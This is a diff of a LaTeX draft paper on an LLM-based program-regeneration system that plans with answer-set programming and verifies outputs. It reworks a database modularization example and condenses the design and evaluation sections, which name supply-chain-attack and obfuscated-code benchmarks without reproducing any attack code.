-In this case, \sys would have run the two functions inside a tight loop and 
-would have aborted the regeneration process if the performance of the generated
-program was not within an acceptable user-defined threshold.
-
-\heading{A rigid music application}
-Consider a JavaScript application that retrieves and displays a user's music
-collection from an SQLite database~\cite{codewithsadeemusicplayer, beets}:
-
-\begin{minted}[frame=lines]{js}
-function getAlbumsByArtist(artist) {
-  const db = new Database("music.db");
-  const rows = db.prepare("SELECT album
-  FROM songs WHERE artist = ?").all(artist);
-  return rows.map(row => row.album); }
-\end{minted}
-
-Having the database initialization being in the same function as 
-the database access has architectural and performance implications.
-In addition, there exist systems that can benefit from further decomposition
-of an application towards automatic distribution, parallelization or security~\cite{Towards_Modern_Ghemaw_2023, vasilakis2019ignis, vasilakis2018breakapp}.
-\begin{wrapfigure}[7]{r}{.8\columnwidth}
+The regenerated implementation is easier to verify, portable across compilers, and avoids undefined behavior.
+
+\heading{A monolithic gameplay function}
+Consider a JavaScript function in the game's scripting environment that
+retrieves and displays a player's saved inventory from a local SQLite database.
+The function combines database initialization and query execution in a single
+block of logic:
+
+\begin{minted}{javascript}
+function getInventory(playerId) {
+const db = new Database("game.db");
+const rows = db.prepare("SELECT
+             item FROM inventory
+             WHERE player_id = ?").all(playerId);
+return rows.map(row => row.item); }
+\end{minted}
+
+Bundling the database connection logic with query execution has architectural
+and performance implications. In addition, systems that support sandboxing or
+automatic distribution benefit from further decomposition of such functions
+into composable components~\cite{Towards_Modern_Ghemaw_2023, vasilakis2019ignis, vasilakis2018breakapp}.
+
+\begin{wrapfigure}[6]{r}{.66\columnwidth}
   \begin{minted}{prolog}
-db('music.db'). func(f1). func(f2).
-trace_sql(p_, I, T) :- trace_sql(p, I, T),
-                       graph(p, I, _).
-graph(call(f2, call(f1), I), I, O) :-
-                       graph(p, I, O).
+db('game.db').func(f1).func(f2).
+sql_trc(p_,I,T):-sql_trc(p,I,T),
+                 graph(p,I,_).
+graph(call(f2,call(f1),I),I,O):-
+                   graph(p,I,O).
   \end{minted}
 \end{wrapfigure}
-\sys, given the query to the right, will 
-generate program that consists of two functions,
-whose composition is equivalent to the original program, and feature 
-the same I/O and trace properties (a trace here being the sequence of SQL 
-queries transmitted to the database) driven by an input.
-\sys wraps the node process with monitors that extract the SQL queries 
-sent to the database for 24 generated inputs.
-Then, after 20.4 seconds and two attempts, it arrives at two functions $f_1$, and 
-$f_2$, where their composition $f_2(f_1(), i)$,
-is equivalent to the original \ttt{getAlbumsByArtist} function across each input $i$.
-A final processing step renames functions $f_1$ and $f_2$ by prompting an LLM instance.
-Alternatively, the user could have provided specific signatures and names for each 
-functions as an additional guiding property.
-The resulting program is:
-\begin{minted}[frame=lines]{js}
+
+Given the query to the right, \sys generates a program that consists of two
+functions whose composition is equivalent to the original implementation and
+that preserve both I/O behavior and SQL trace properties (where a trace records
+the sequence of queries executed against the database).
+
+\sys wraps the Node.js process with monitors that extract the SQL queries
+issued by the original function on 24 generated inputs.
+After 20.4 seconds and
+two attempts, it produces two functions, $f_1$ and $f_2$, such that their
+composition $f_2(f_1(), i)$ is behaviorally equivalent to \texttt{getInventory}
+for each input $i$.
+A final processing step renames the functions by prompting
+an LLM instance.
+Alternatively, the user could have supplied specific names and
+signatures as additional guiding properties.
+
+The resulting modular program is:
+\begin{minted}{javascript}
 function connectDB() {
   const sqlite = require('sqlite');
- return sqlite.open({filename: 'music.db'});
-}
-
-function getAlbumsByArtist(db, artist) {
- const rows = await db.all("SELECT album
- FROM songs WHERE artist = ?", artist);
- return rows.map(row => row.album); 
-}
+  return sqlite.open({filename: 'game.db'}); }
+
+async function getInventory(db, playerId) {
+const rows = await db.all("SELECT 
+             item FROM inventory
+             WHERE player_id = ?", playerId);
+return rows.map(row => row.item); }
 \end{minted}
@@
 
-\section{Overall Design}
+\section{System Overview}
 \label{sec:design}
 
-% \sys is a system for program regeneration: given an input program and a set of
-% behavioral, structural, or syntactic properties, it synthesizes a new program
-% that satisfies a specified subset of those properties. The system treats
-% regeneration as a goal-driven process, guided by explicit property
-% specifications and a symbolic planner that structures the search space for a
-% backend synthesizer.
-At a high level, \sys operates in four phases: (1) plan construction, (2)
-property extraction, (3) program synthesis, and (4) verification and feedback.
-These phases interact through a shared representation of the program and its
-transformation goals.
-
-\heading{Plan construction}
-First, each of the available plugins contributes a set of pre and post-conditions 
-to the logic engine.
-Essentially, these describe what needs to hold for an analysis to be applicable to the given 
-program and what properties \sys will preserve or transform after regeneration.
-Then, the planning component accepts one or more user-provided regeneration goals (termed as the query).
-The full set of rules and predicates are used to construct an ASP program
-which is then given to an off-the-shelf solver~\cite{gebser2007clasp}.
-% TODO: Explain what the solvr does (optimization)
-From the solver's output, the planner constructs a plan that specifies which
-analyses \sys plugins should apply to the input program and what properties can be
-preserved during regeneration in order to fulfill the query.
-
-\heading{Property extraction} \sys then continues by analyzing the input program to
-extract the collection of properties.
-These may describe the program's interface
-(\eg, exported functions), its operational constraints (\eg, disallowing
-filesystem access), or its structure (\eg, use of a particular API or programming idiom).
-While some properties are derived from generic analyses
-applicable across languages~(\eg examples of input-output behavior), others are specific to the input program's language and runtime model.
-
-\heading{Synthesis}
-Guided by the transformation plan, \sys creates a prompt template which is then
-augmented with the extracted properties, having them normalized to a human-readable text representation.
-This prompt is then passed to an LLM instance.
-\sys does not include by default the original program's source code in the prompt.
-Instead, it uses the extracted properties to guide the LLM instance 
-to synthesize a candidate program that satisfies the specified constraints.
-
-\heading{Verification and feedback}
-The final phase verifies that the
-synthesized program satisfies the target properties.
-If verification fails---due to a violated constraint or behavioral divergence---\sys uses this
-failure as a signal to refine the plan or re-sample the synthesis step.
-This forms a feedback loop: planning, synthesis, and verification interact until \sys
-produces a satisfactory program or the system exhausts its search.
-
-\section{Property Language and Extraction}
-\label{sec:dsl}
-
-\sys represents program characteristics as symbolic \emph{properties}, drawn from a language of first-order predicates.
-These properties describe aspects of the input program and serve as regeneration constraints for the output.
-They form the basis of both planning and verification.
-All aspects of the symbolic representation are expressed as answer-set programming (ASP) facts and rules (an example program is shown in \cref{lst:logic-example})~\cite{Eiter_2009}.
-
-\heading{Answer Set Programming}
-Answer Set Programming (ASP) \cite{Gelfond_2000, Eiter_2009} is a problem-solving paradigm with roots in logic programming and non-monotonic reasoning.
-The programming 
-model of ASP is one where the programmer models
-the problem domain, with the solution being handled by a solver program.
-Programming using this paradigm is done in a family of languages sometimes called \textit{AnsProlog} \cite{Gelfond_2002}.
-This work uses the input language of \textit{Clingo} \cite{DBLP:journals/corr/GebserKKS14}, which 
-is a high-performance integrated solver with a large collection of libraries and bindings helpful in integrating it with external tools.
-
-The syntax, similar to that of \textit{Prolog} and \textit{Datalog}, with code and data being represented
-through logical terms. Collections of logical terms, as seen in
-\cref{lst:terms}, can represent the game world's state. Rules, expressed using
-the \texttt{:-} operator, enable complex reasoning by defining relationships
-between atoms. Choice rules, exemplified in \cref{lst:choice}, allow the ASP
-solver to make selections among atoms. Integrity constraints, as shown in
-\cref{lst:constraint}, can restrict invalid answer sets. Optimization
-directives, such as \texttt{\#minimize} and \texttt{\#maximize} in
-\cref{lst:optimization}, guide the solver to output optimal answer sets.
-
-\begin{listing}
-\begin{minted}{prolog}
-language(p, javascript).
-len(p, 100).
-\end{minted}
-\caption{A set of facts over a program.}
-\label{lst:terms}
-\end{listing}
-
-\begin{listing}
-\begin{minted}{prolog}
-graph(p_) :- graph(p).
-len(p_, N) :- len(p, N_), N = N_ + 1.
-\end{minted}
-\caption{Logic rules describing relationships between the original and regenerated program.}
-\label{lst:rules}
-\end{listing}
-
-\begin{listing}
-\begin{minted}{prolog}
-{absent(F) : function(F, P)} :- program(P).
-\end{minted}
-\caption{A choice rule.}
-\label{lst:choice}
-\end{listing}
-
-\begin{listing}
-\begin{minted}{prolog}
-:- language(p, X), language(p_, Y), X != Y.
-\end{minted}
-\caption{An integrity constraint.}
-\label{lst:constraint}
-\end{listing}
-
-\begin{listing}
-\begin{minted}{prolog}
-#minimize{C : cost(E,C)}.
-\end{minted}
-\caption{An optimization directive.}
-\label{lst:optimization}
-\end{listing}
-
-% To compute answer sets, ASP programs are input into ASP solvers.
-% These solvers provide efficient mechanisms to generate the set of valid answers to the given problem.
-% An ASP solver can be thought of as a black box, with them being interchangeable as 
-% long as the input language semantics remain the same.
-
-\heading{Property predicates}
-Each property is a logical predicate over the program symbol $p$. Examples include:
+\sys is a programming framework for program regeneration.
+It enables developers to express transformation goals declaratively—as constraints over the desired properties of regenerated code—and automatically synthesizes implementations that satisfy those constraints.
+
+At a high level, \sys operates in three stages:
+
+\begin{enumerate}
+  \item \textbf{Property Specification and Extraction}: Users define goals using logical constraints over program properties (e.g., language, side-effect freedom, input/output equivalence).
+Plugins contribute analyses and extraction routines to populate these properties from the input program.
+  \item \textbf{Constraint-Guided Synthesis}: The framework converts property constraints into structured prompts for a language model.
+These prompts describe what must be preserved or changed, including examples and declarative requirements.
+  \item \textbf{Verification and Feedback}: Synthesized candidates are validated against the target properties.
+Failures trigger retries or incremental refinements until the goals are satisfied or search is exhausted.
+\end{enumerate}
+
+This design makes regeneration tasks programmable, composable, and extensible, without requiring developers to encode transformation logic manually.
+
+\section{Query Language and Synthesis}
+\label{sec:synthesis}
+
+\sys represents program characteristics as symbolic \emph{properties}, expressed as first-order predicates. Examples include:
+
 \begin{itemize}
-  \item \texttt{language}$(p, \texttt{javascript})$: the input program is written in JavaScript.
-  \item \texttt{signature}$(p, S)$: the program exposes a well-formed function signature $S$.
-  \item \texttt{pure}$(p)$: the program does not have side-effects (\eg file system access, network calls, \etc).
+  \item \texttt{language(p, javascript)}: the regenerated program must be in JavaScript.
+  \item \texttt{pure(p)}: the program must be side-effect free.
+  \item \texttt{signature(p, S)}: the program must export a specific API.
 \end{itemize}
 
-A property $X$ appears as either an
-  $\mathsf{can}(X)$ atom, which denotes that the system is capable of extracting or inferring property $X$ from the input.
-  Plugins add these facts and represent the system's capabilities.
-  A pure $X$ atom denotes that either the user has explicitly requested property $X$ to be enforced, or the planner has deduced that it is necessary to satisfy the query.
-
-\heading{Planning over properties}
-The logic engine determines the set of active properties to enforce by solving
-a constrained optimization problem over the property set $P_r$.
-It satisfies the
-following key constraint:
-\begin{align*}
-  X &\Leftarrow \mathsf{can}(X) &\text{Apply only extractable properties}
-\end{align*}
-\sys also supports minimization, maximization and elimination of properties
-through the $\mathsf{min}$, $\mathsf{max}$, and $\mathsf{not}$ directives.
-Without loss of generality, the base case is described, explicitly mentioning any significant semantic difference when necessary.
-
-Additionally, the system takes advantage of ASP's least stable model semantics.
-Essentially, the planner tries to give the synthesizer the least amount of information
-possible, as long as all regeneration goals are fulfilled.
-
-\heading{Plugin-defined rules}
-Plugins contribute domain-specific inference rules and constraints. For example, a plugin for JavaScript-to-Haskell translation may define:
-\begin{align*}
-\mathsf{can}(\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p)) & \\
-\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p) &\Rightarrow \texttt{language}(p, \texttt{haskell}) \\
-\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p) &\Rightarrow \mathsf{language}(p, \texttt{javascript})
-\end{align*}
-Another plugin might contribute $\mathsf{can}(\texttt{signature}(p))$, indicating it can extract the function signature.
-At this stage, \sys only cares about semantics of each plugin in relation to how it might enable or violate
-other properties in the regenerated program.
-
-\heading{Axioms and domain knowledge}
-The logic engine also includes domain-wide axioms based on some common assumptions.
-For example
-$\texttt{language}(p, \texttt{haskell}) \Rightarrow \texttt{pure}(p)$
-captures the assumption that programs written in Haskell are pure by default.
-Such axioms allow inferred properties to trigger downstream constraints or synthesis behaviors.
-
-\begin{listing}
-  \begin{minted}[frame=lines, fontsize=\small]{prolog}
-% --- Base program facts ---
-language(p, c).
-
-% --- Plugin: len ---
-can(len(p)). 
-% Plugin: signature ---
-can(signature(p)).
-% ---  Plugin: javascript2haskell ---
-can(js2hs(p)). 
-do(language(p, haskell)) :- do(js2hs(p)).
-:- do(js2hs(p)), not language(p, javascript).
-
-% ---- Axioms ----
-:- X, not can(X). % All transformations must be possible
-:- language(p, L1), language(p, L2)),
-    L1 != L2. % A program can have one language
-
-% --- User query ---
-#min len(p). % User query
-\end{minted}
-  \caption{\textbf{Example \sys logic program.}
-  This is a lightly simplified version of the logic program that produces the plan for the idiomatization task~(\cref{sec:example}). 
-  The program contains facts coming from (1) the input program (written in C),
-  (2) three plugins (\ttt{len}, \ttt{signature}, and \ttt{javascript2haskell}),
-  (3) axioms from the logic engine (\eg a program can have one language, an analysis will be applied only if possible, all goals must be satisfied), and
-  (4) the user query (the user wants to minimize the length of the program).
-  }
-  \label{lst:logic-example}
-\end{listing}
-
-\heading{Compilation to ASP}
-Given a source program written in the \sys query language, the compiler performs a syntactic
-de-sugaring into ASP rules~(\cref{fig:asp-compilation}).
-
-\begin{figure}[htpb]
+Plugins contribute two things:
+\begin{enumerate}
+  \item \emph{Capability declarations}, stating which properties they can extract (e.g., \texttt{can(signature(p))}) or enforce.
+  \item \emph{Logic rules}, defining relationships between properties (e.g., a translation to Haskell implies purity).
+\end{enumerate}
+
+Internally, these constraints are encoded in Answer Set Programming (ASP)~\cite{Gelfond_2000, Eiter_2009}.
+\sys solves for a minimal set of properties that satisfy the user’s query, then extracts them from the input program using plugin-provided analyzers.
+
+Once the relevant properties are available, \sys assembles a structured prompt for the synthesizer. This prompt consists of:
+
+\begin{itemize}
+  \item \emph{Natural-language instructions} derived from enforced properties (e.g., "The function must be implemented in JavaScript and have no side effects.")
+  \item \emph{Concrete examples}, such as input-output pairs or signature templates.
+\end{itemize}
+
+Unlike manual prompt engineering, this approach composes property constraints automatically, ensuring consistency between synthesis goals and verification criteria.
+
+\section{Verification and Feedback}
+\label{sec:verification}
+
+After synthesis, \sys verifies whether the regenerated program satisfies all
+enforced properties. Each property has a dedicated checker, contributed by the
+same plugins that extract or infer it. For example:
+
+\begin{itemize}
+  \item \texttt{graph(p, I, O)}: A checker runs the synthesized code on test inputs and compares outputs.
+  \item \texttt{pure(p)}: A static analyzer detects side-effecting operations.
+  \item \texttt{signature(p, S)}: A parser validates exported function signatures.
+\end{itemize}
+
+If any verification fails, \sys treats this as feedback to resample or refine
+the synthesis. This loop continues until all constraints are met or search is
+exhausted. Partial regeneration is allowed: functions that pass verification
+are retained, while others remain unchanged.
+This process makes program regeneration an iterative, declarative workflow,
+bridging symbolic reasoning with data-driven synthesis.
+
+\section{Discussion}
+\label{sec:evaluation}
+
+We evaluate \sys across several dimensions: its ability to regenerate correct and maintainable code, the impact of property-driven guidance, and practical considerations around applying it to diverse inputs.
+This evaluation is preliminary and intended to illustrate feasibility and trade-offs.
+
+\subsection{Benchmarks}
+
+Our benchmark suite comprises 37 tasks spanning simple translation, obfuscation removal, and security hardening (Table~\ref{tab:benchmarks}).
+Inputs were drawn from Rosetta Code, popular npm and PyPi packages, known supply-chain attacks, and selected obfuscated programs from the IOCCC.
+
+A regeneration is counted as successful if the output satisfies the declared properties and passes either functional tests or manual inspection.
+
+\begin{table*}[ht]
 \centering
-\small
-\begin{tabular}{l}
-\textbf{toasp} (q : Query) : ASPCode {$\leftarrow$} \textbf{match} q \textbf{with} \\[0.5ex]
-\quad \textbar~$X$: ungroundable($X$) {$\rightarrow$} \texttt{do(}$X$\texttt{)} \\
-\quad \textbar~\#\texttt{min}~$X$ {$\rightarrow$} \texttt{do\_min(}$X$\texttt{)} \\
-\quad \textbar~\#\texttt{max}~$X$ {$\rightarrow$} \texttt{do\_max(}$X$\texttt{)} \\
-\textbf{end}
-\end{tabular}
-\caption{DSL-to-ASP compilation rules. Ungroundable atoms are wrapped in \texttt{do} to denote candidate actions. Optimization directives are compiled to \texttt{do\_min} and \texttt{do\_max}.}
-\label{fig:asp-compilation}
-\end{figure}
-
-These transformations yield a groundable ASP program that can be evaluated by the backend ASP solver.
-
-% TODO: Show graph showing how properties go from the abstract logic domain to the real domain through a translation barrier
-\heading{Logic and concrete space}
-\sys operates at the boundary between two representational domains: a symbolic
-\emph{logic space}, where transformations over program properties are expressed, and
-a \emph{concrete space}, where actual programs, inputs, outputs, and traces
-reside.
-
-In the logic space, properties are encoded as predicates over abstract program
-identifiers.
-To bridge this abstraction gap, \sys given the set of true predicates
-from the logic space, extracts the corresponding concrete properties from the
-source program.
-For example, the predicate $\texttt{inputs}(p, I)$ in the logic space
-will be concertized to set of inputs $I$ by invoking the \texttt{input} plugin,
-which uses an LLM to generate a set of inputs for the program $p$.
-Similarly, the predicate $\texttt{graph}(p, I, O)$ will be concertized to a set of
-input-output pairs $(I, O)$ by executing the program $p$ on the inputs $I$ and
-recording the outputs $O$.
-After regeneration, the predicates over the concrete regenerated program $p\_$
-will be checked regarding their relationship to the same properties over program $p$
-in the logic space.
-An equality relationship is one where the grounded version of the predicate
-$X$ is the same between the two programs, modulo the program identifier~(\eg, $\texttt{graph}(p, i, o) \equiv \texttt{graph}(p\_, i, o)$).
-Equality is defined differently for each property, and is enforced by the corresponding plugin.
-Similarly, minimization and maximization relationships are defined as
-the concrete property value being less than or greater than the original program's value, respectively.
-Again, the less-than and greater-than operators are defined by the plugin that verifies the property.
-
-% In the current \sys implementation, this translation is one-way,
-% however the system can be extended to support two-way translation, where properties extracted
-% can be used to generate new properties in the logic space.
-
-As shown in \cref{fig:logic-to-concrete}, this process constitutes a
-translation barrier: declarative goals over properties like \texttt{inputs},
-\texttt{outputs}, and \texttt{traces} are realized through observation and
-instrumentation. Once aligned, the logic engine can reason over these grounded
-facts to drive transformation.
-
-% add figure
-\begin{figure}[htpb]
-\centering
-  % https://docs.google.com/drawings/d/1JdOfgpaVUy7_EgFyguRXHxFKdmZwyHaiHshnifHG0TQ/edit?usp=sharing
-  \includegraphics[width=.9\columnwidth]{figs/kvasir_logic-space.pdf}
-  \caption{\textbf{\sys transforms a program over its properties from the abstract logic space to the concrete space.}
-  Relationships between properties of the original and regenerated program are inferred 
-  from the query in combination with the knowledge base and enforced by \sys plugins.
-  }
-  \label{fig:logic-to-concrete}
-\end{figure}
-
-\heading{Extensibility}
-\sys decentralizes property extraction: plugins contribute $\mathsf{can}(\cdot)$ facts, and pre- and post-conditions, while the core planner resolves which properties to enforce based on goals, capabilities, and axioms.
-This modularity allows language-specific analyses to coexist with general-purpose reasoning in a unified planning layer.
-
-\section{Synthesis Plan}
-\label{sec:synthesis}
-
-The synthesis process begins with a set of enforced properties $\mathbf{X}$
-which the planner selected~(\cref{sec:dsl}).
-These properties
-reflect both user goals (\eg removing side effects, translating to a
-different language) and structural characteristics of the input program that
-the synthesizer will preserve.
-The planner constructs a transformation plan that
-specifies, for each relevant unit of code (typically a function), what
-constraints must hold in the regenerated version.
-
-For instance, a plan for regenerating a specific function $f$ might include:
-\texttt{language}(f, \texttt{haskell}) the function must be written in Haskell, 
-\texttt{pure}(f)) the function must be side-effect-free, and 
-\texttt{signature}(f, s)) the function must keep the original program's signature $s$.
-
-\heading{LLM-guided regeneration}
-A structured prompt guides the language model, which performs the synthesis task.
-The prompt is a composition of natural-language text fragments plugins contribute. 
-A plugin can include domain-specific instructions as further guidance.
-For example:
-A \ttt{signature} plugin may contribute:
-
- \promptbox{
-   {The output should implement a function \texttt{sqrt(n: float): float}.}
- }
-A \ttt{length} plugin combined with a minimization goal may prepend:
-
-\promptbox{
-  {The output should be as short as possible while preserving the original functionality.}
-}
-A \ttt{javascript2haskell} plugin may prepend:
-
-\promptbox{
-  {The output function should be written in Haskell.}
-}
-
-These fragments, combined with a normalized text representations of each of 
-the extracted properties constitute the prompt given to the LLM.
-
-\heading{Constraint-guided generation}
-While \sys delegates code synthesis to a large language model, the planner constrains the generation space in two key ways.
-First, the prompt instructs the LLM to perform only transformations that are valid under the current plan.
-For instance, if the target function must be pure, the prompt will exclude information such as system-call traces that might imply side-effectful behavior.
-Second, candidate outputs are verified post hoc against the enforced properties~(\cref{sec:verification}).
-% This hybrid model balances flexibility with rigor: the LLM provides diversity and fluency, while the planner ensures adherence to property-based constraints.
-
-\section{Property Verification and Feedback Loop}
-\label{sec:verification}
-
-To validate that a regenerated program satisfies the intended goals, \sys includes an explicit verification phase that checks whether the output adheres to the enforced properties in the synthesis plan.
-Verification accepts only programs that meet the plan's constraints and provides feedback for refining or retrying those that do not.
-
-\heading{Verification as property checking}
-After synthesis, \sys invokes a set of property-specific checkers.
-Each checker
-is responsible for evaluating whether a property $X$ holds
-for the regenerated program fragment.
-These checkers operate at varying levels
-of precision---ranging from structural pattern checks to light static or
-symbolic analysis---and are tailored to the property type.
-
-Examples include:
-\begin{itemize}
-  \item For $\texttt{no\_network}(f)$, the checker confirms the absence of known network APIs or imports.
-  \item For $\texttt{signature}(f)$, the checker matches the regenerated function's name, parameters, and arity against the extracted signature.
-  \item For $\texttt{pure}(f)$, the checker examines control flow and side-effecting operations to detect possible violations.
-\end{itemize}
-
-Checkers are modular and contributed by plugins. Their combined results determine whether a candidate is considered valid under the current plan.
-For minimization and maximization goals, the verification phase uses the less-than or greater-than operators as are defined internally by the plugin verifying the given property.
-Verification in this case checks if the property's value has decreased or increased compared 
-to the previous regeneration attempt.
-If the value remains unchanged for two consecutive attempts, its considered satisfied.
-
-\heading{Failure-driven refinement}
-When a candidate fails verification, \sys treats this as a feedback signal.
-Instead of discarding the regeneration attempt wholesale, the system uses the failure to revise or re-execute the synthesis phase.
-Some forms are:
-\begin{itemize}
-  \item \emph{Retrying synthesis}: A fresh LLM call with the same plan but a different generation path.
-  \item \emph{Feedback loop}: \sys will provide the previous regeneration attempt 
-    as an additional context to the LLM, together with an explanation of the properties that the regeneration violates, prompting it to adapt its output based on prior failures.
-    This mode is only activated if the verifier knows that the output will not to taint
-    followup regeneration attempts.
-  \item \emph{Fallback handling}: If a function repeatedly fails validation, \sys may leave the original version intact or mark it for manual inspection.
-\end{itemize}
-
-% This loop provides adaptability: regeneration is not expected to succeed unconditionally, but rather to proceed incrementally under interpretable, bounded failure modes.
-
-\heading{Partial regeneration and composition}
-\sys supports regeneration at the granularity of individual functions.
-If only a subset of functions can be successfully regenerated under the given constraints, the remaining ones remain unchanged after regeneration.
-The output program thus consists of a composition of validated regenerated units and untouched originals.
-This model supports application in real-world codebases, where partial improvement (\eg replacing unsafe or deprecated functions) can be meaningful even without complete coverage.
-
-\section{Evaluation}
-\label{sec:evaluation}
-
-The \sys evaluation is along three axes:
-
-\begin{itemize}
-  \item[\textbf{Q1}] \textbf{Correctness and Regeneration Quality}: Does \sys preserve program behavior and produce high-quality programs?
-  \item[\textbf{Q2}] \textbf{LLM Baseline}: How does \sys compare to naively prompting a large language model?
-  \item[\textbf{Q3}] \textbf{Planning Efficiency \& Precision}: Does minimizing extracted properties help regeneration succeed faster and more reliably?
-\end{itemize}
-
-\section{Benchmarks \& Methodology}
-
-The \sys evaluation comprises of six benchmark suites, summarized in \cref{tab:benchmarks}.
-Each task consists of an input program, a \sys query expressing desired
-properties, and a test suite or functional oracle.
-Each benchmark is executed three times. A regeneration is considered overall successful 
-if it is correct, satisfies the query, and passes all tests all three times.
-The Rosetta Code~\cite{rosettacode} benchmarks include four programming tasks written in four different
-languages each (Python, JavaScript, C, and Haskell). 
-These include classic programs that do not require any language-specific features to implement.
-These are: the classic \emph{Hello, World!} program as found in most programming tutorials,
-a program that applies the ROT-13 cipher to a string,
-a program that computes the median of a list of numbers,
-and a program that reads a file and prints its contents to the console line-by-line.
-The npm benchmark includes ten popular (100.000+ weekly downloads) npm packages that implement utility
-functionality such as string manipulation, data structure transformations, and math.
-Similarly, the PyPi utilities benchmark includes three functions sourced from PyPi that implement similar functionality.
-The SSCA dataset includes three sneaky supply-chain attacks that obfuscate malicious behavior in otherwise innocuous-looking code.
-The attack activates under specific environment conditions, such as the presence of a specific environment variable or specific inputs
-getting passed to the program.
-The attacks involve private key stealing~\cite{ohm2020backstabber}, Bitcoin private key theft~\cite{ev:eurosec:2022}, and an SSH backdoor installation~\cite{copeland2019frightening}
-and occur while the program still performs its advertised functionality.
-The IOCCC benchmark includes two programs from the International Obfuscated C Code Contest (IOCCC)~\cite{ioccc}.
-These programs are intentionally obfuscated, using advanced techniques such as bit manipulation, undefined behavior,
-and exploitation of the C preprocessor and the lax parsing rules of the C language.
-These programs perform mathematical computations like Mersenne primality testing and adding two numbers.
-Finally, the microbenchmarks include three programs that implement the regeneration tasks discussed in \cref{sec:example}.
-
-\begin{table*}[htpb]
-\centering
-  \caption{\textbf{Benchmark summary}. 
-  Benchmark programs come from online repositories, public archives, security research datasets, and often referenced examples in programming culture.
-The N column shows the number of programs/functions from each benchmark.
-}
-  \begin{tabular*}{\textwidth}{llrrll}
+\caption{\textbf{Benchmark Overview}.}
+\begin{tabular*}{\textwidth}{@{\extracolsep{\fill}} l r l l}
 \toprule
-Benchmark                          & Description        & N  & LoC  & Task                   & Source \\
+Benchmark & N & Purpose & Sources \\
 \midrule
-Rosetta Code                       & Simple tasks       & 16 &      & Translation            & \cite{rosettacode} \\
-Short utilities                    & npm/PyPi utilities & 13 &      & Parity                 & \cite{regbench2025} \\
-SSCA                               & Sneaky supply-chain attacks        & 3  &      & Attack elimination     & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
-IOCCC                              & Obfuscated C code       & 2  &      & De-obfuscation         & \cite{ioccc} \\
-Microbenchmarks                    &                    & 3  &      &                        & \\
-\hspace{.5em} \ttt{flatmap-stream} & Flat-map utility   &    &      & Purity and translation & \cite{es1}  \\
-\hspace{.5em} \ttt{Q\_rsqrt}       & Inverse square root function       &    &      & Idiomatic rewrite      & \cite{fast_inv_sqrt}  \\
-\hspace{.5em} \textsf{rigidDB}     & Fetch artist songs from a music database     &    &      & Modularization         & \cite{codewithsadeemusicplayer} \\
-\midrule
-Total                              &                    & 37 &      &                        & \\
+Rosetta Code & 16 & Cross-language translation & \cite{rosettacode} \\
+Short Utilities & 13 & Parity preservation & \cite{regbench2025} \\
+SSCA & 3 & Malicious behavior removal & \cite{ohm2020backstabber,ev:eurosec:2022} \\
+IOCCC & 2 & Deobfuscation & \cite{ioccc} \\
+Microbenchmarks & 3 & Idiomatic rewriting, modularization & This paper \\
 \bottomrule
@@
 
-\subsection{Q1: Correctness and Regeneration Quality}
-
-Correctness is evaluated using developer-made test suites 
-shipped with the original software components as well as by manually inspecting
-the regenerated source code and report on correctness and the other query target metrics.
-When no test suite is available, only manual inspection is performed.
-
-\begin{table}[htpb]
-  \centering
-  \caption{\textbf{Correctness result summary.} Number of tasks passing all tests (when present) and manual inspection.}
-  \begin{tabular}{lc}
-    \toprule
-    Benchmark & Correctness \\ 
-    \midrule
-    Rosetta Code & 16/16  \\
-    Short Utilities & 13/10 \\
-    SSCA & 3/3  \\
-    IOCCC & 1/2 \\
-    Microbenchmarks & 2.5/3  \\
-    \bottomrule
-  \end{tabular}
-\end{table}
-
-\sys successfully regenerates all programs in the Rosetta Code benchmark suite,
-having verified manually that the output is functionally equivalent
-to the original, using both the original and translated reference
-implementations as guides.
-\sys regenerates correctly all npm and PyPi utilities, it does not introduce and side-effectful or malicious behavior.
-The synthesized programs reveal interesting insights and patterns.
-\sys-generated code often lacks the optimizations commonly
-implemented by library developers, such as early exits or caching.
-For instance, the \texttt{left-pad} library, pre-computes padding for strings below a certain length
-and returns it directly.
-In contrast, \sys tends to produce straightforward
-implementations without attempting similar optimizations.
-\sys also omits domain-specific knowledge:
-\sys-generated code frequently fails to account for all edge cases when they involve language-specific features (\eg \ttt{is-nan}).
-% \sys has weak performance on libraries that involve complex regexes or perform non-trivial math.
-For the SSCA benchmarks, \sys successfully regenerates all three malicious libraries, removing the malicious behavior while preserving the original functionality.
-For the flatmap-stream attack, \sys uses some domain-specific logic (encoded in its knowledge-base by the \ttt{js-stream} plugin) to generate a function that produces a node \ttt{Stream} object.
-For the IOCCC benchmarks, \sys regenerates the \ttt{adder} program, which is a simple program that adds two numbers,
-it also regenerates \ttt{mersenne} in regards that it correctly performs a naive Mersenne primality testing, but it does not follow the non-obvious output scheme of the original program, which returns a non-zero hexadecimal number when $2^p - 1$ ($p$ being the input number) is not prime.
-For the microbenchmarks, \sys correctly regenerates the \ttt{flatmap-stream} program, producing a safe Haskell version that is idiomatic and preserves the original functionality.
-However, this version does not match exactly the semantics of the original one, as it operates over infinitely nested lists, rather than only one level deep ones.
-The \ttt{Q\_rsqrt} program includes the obvious, idiomatic computation of the inverse square root ($1/\sqrt{x}$) rather than the original bit-level manipulation.
-Finally, \sys successfully decomposes the \ttt{rigidDB} program into two
-functions, \ttt{setupDatabase} and \ttt{getAlbumsByArtist}, which is a
-modularization that preserves the original functionality and produce equivalent I/O and SQL traces.
-
-\sys is able to regenerate programs that are correct and preserve the original functionality,
-while also removing any malicious behavior or obfuscation.
-Failure cases highlight current limitations, and inspire future work~(\cref{sec:discussion}).
-
-\subsection{Q2: Naive LLM vs. \sys}
-
-To compare \sys against a baseline, we use a \gptmodel instance
-that performs prompt-only rewriting without explicit access to guiding properties.
-The LLM gets the following prompt template:
-
-\promptbox{
-  \emph{Task description}\\
-
-  Program:\\
-  \emph{Program/function source code}\\
-
-  Please return the program's source code after performing the task.
-}
-
-For the Rosetta Code benchmarks, \gptmodel 
-successful in all language translation tasks.
-The original and LLM-generated code matches the semantics
-of the original one, confirmed after manually inspecting the generated code.
-Similarly, the LLM was successful in transforming the npm and PyPi utilities towards
-removing any vulnerabilities from them, as they are benign and the transformation
-involved the LLM simply repeating the original code without any changes.
-The SSCA benchmark tasks are more interesting, as they involve 
-malicious code. For the malicious libraries, we provide the LLM 
-with two different versions. One is the original high-profile attack that appeared on npm,
-with the second one being an attack that is semantically equivalent but with the source 
-having gone through an iterative loop where a second LLM is tasked with making the code ostensibly 
-secure. This involves adding integrity checks at all points in the program where a value is used.
